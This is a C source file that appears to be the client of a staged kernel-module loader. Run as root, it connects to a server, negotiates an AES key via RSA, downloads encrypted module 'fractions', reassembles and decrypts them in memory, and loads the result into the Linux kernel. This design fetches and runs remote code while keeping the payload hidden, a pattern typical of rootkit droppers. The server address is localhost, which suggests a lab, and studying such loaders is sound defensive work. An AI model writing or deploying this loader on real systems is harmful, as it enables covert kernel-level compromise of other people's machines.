#include <openssl/evp.h>
#include <stdlib.h>
#include <sys/types.h>
#include <unistd.h>

#include "../include/fraction.h"
#include "../include/http.h"
#include "../include/load.h"
#include "../include/log.h"
#include "../include/sock.h"
#include "../include/utils.h"
#define SERVER_IP "127.0.0.1"
#define SERVER_PORT "8000"

static void cleanup_fraction_array(fraction_t *array, int n_elem) {
  for (int i = 0; i < n_elem; i++) {
    fraction_free(&array[i]);
  }
  free(array);
}

static int do_connect(void) {
  struct addrinfo hints, *ainfo;
  int sfd;

  setup_hints(&hints);

  if (h_getaddrinfo(SERVER_IP, SERVER_PORT, &hints, &ainfo) != 0) {
    log_error("Failed to resolve server address");
    return -1;
  }

  printf("Connecting to: %s:%s\n", SERVER_IP, SERVER_PORT);
  sfd = create_sock_and_conn(ainfo);
  if (sfd == -1) {
    log_error("Failed to create socket and connect");
    return -1;
  }
  freeaddrinfo(ainfo);

  return sfd;
}

static uint8_t *get_aes_key(int sfd, size_t *key_length) {
  EVP_PKEY *pkey = NULL;
  char *public_key = NULL;

  http_res_t http_post_res = {0};

  unsigned char *b64_decoded_aes_key;
  unsigned char *aes_key = NULL;
  size_t key_len = 0;

  pkey = generate_rsa_private_key();
  if (pkey == NULL) {
    return NULL;
  }

  public_key = write_rsa_public_key(pkey);
  if (public_key == NULL) {
    EVP_PKEY_free(pkey);
    return NULL;
  }

  /* Receive and decrypt AES key from server */
  if (http_post(sfd, "/", "application/octect-stream", public_key,
                &http_post_res) != HTTP_SUCCESS) {
    log_error("Failed to send RSA public key");
    free(public_key);
    EVP_PKEY_free(pkey);
    return NULL;
  }

  log_info("Base64 encoded key: %s", http_post_res.data);
  base64_decode(http_post_res.data, &b64_decoded_aes_key, &key_len);
  log_info("Key size (decoded): %zu", key_len);

  aes_key = decrypt_rsa_oaep_evp(pkey, b64_decoded_aes_key, key_len, &key_len);
  if (aes_key == NULL) {
    log_error("Failed to decrypt data from server");
    free(b64_decoded_aes_key);
    http_free(&http_post_res);
    free(public_key);
    EVP_PKEY_free(pkey);
    return NULL;
  }

  free(b64_decoded_aes_key);
  http_free(&http_post_res);
  free(public_key);
  EVP_PKEY_free(pkey);

  *key_length = key_len;
  return aes_key;
}

static fraction_t *fetch_fractions(int sfd, int *fraction_count) {
  http_res_t http_fraction_res = {0};

  fraction_t *fractions = NULL;

  int i, num_links;
  char *line;

  if (http_get(sfd, "/", &http_fraction_res) != HTTP_SUCCESS) {
    log_error("Failed to retrieve fraction links");
  }

  log_debug("Retrieved fraction links");

  num_links = count_lines(http_fraction_res.data) + 1;

  log_debug("%d links found", num_links);

  fractions = calloc(num_links, sizeof(fraction_t));
  if (!fractions) {
    log_error("Failed to allocate memory for fractions");
    http_free(&http_fraction_res);
    return NULL;
  }

  i = 0;
  line = strtok(http_fraction_res.data, "\n");
  while (line != NULL && i < num_links) {
    log_debug("Downloading %s", line);

    if (download_fraction(sfd, line, &fractions[i]) != 0) {
      log_error("Failed to download fraction");

      // we have to cleanup only until i because the other fractions have not
      // been initialized anyhow
      http_free(&http_fraction_res);
      cleanup_fraction_array(fractions, i);
      return NULL;
    }

    i++;
    line = strtok(NULL, "\n");
  }

  http_free(&http_fraction_res);
  *fraction_count = i;
  return fractions;
}

int main(void) {
  int sfd = -1; // to be extra professional

  unsigned char *aes_key = NULL;
  size_t key_len = 0;

  fraction_t *fractions;
  int fraction_count;

  uint8_t *module = NULL;
  ssize_t module_size;

  if (geteuid() != 0) {
    log_error("This program needs to be run as root!");
    exit(1);
  }

  init_random();
  log_set_level(LOG_DEBUG);

  sfd = do_connect();
  if (sfd < 0) {
    return EXIT_FAILURE;
  }

  aes_key = get_aes_key(sfd, &key_len);
  if (aes_key == NULL) {
    close(sfd);
    return EXIT_FAILURE;
  }

  fractions = fetch_fractions(sfd, &fraction_count);
  if (fractions == NULL) {
    free(aes_key);
    close(sfd);
    return EXIT_FAILURE;
  }

  log_info("Downloaded fractions");

  qsort(fractions, fraction_count, sizeof(fraction_t), compare_fractions);

  module = decrypt_lkm(fractions, fraction_count, &module_size, aes_key);
  if (module == NULL) {
    log_error("There was an error creating the module");
    cleanup_fraction_array(fractions, fraction_count);
    free(aes_key);
    close(sfd);
    return EXIT_FAILURE;
  }

  if (load_lkm(module, module_size) < 0) {
    log_error("Error loading LKM");
    free(module);
    cleanup_fraction_array(fractions, fraction_count);
    free(aes_key);
    close(sfd);
    return EXIT_FAILURE;
  }

  free(module);
  cleanup_fraction_array(fractions, fraction_count);
  free(aes_key);
  close(sfd);

  return EXIT_SUCCESS;
}
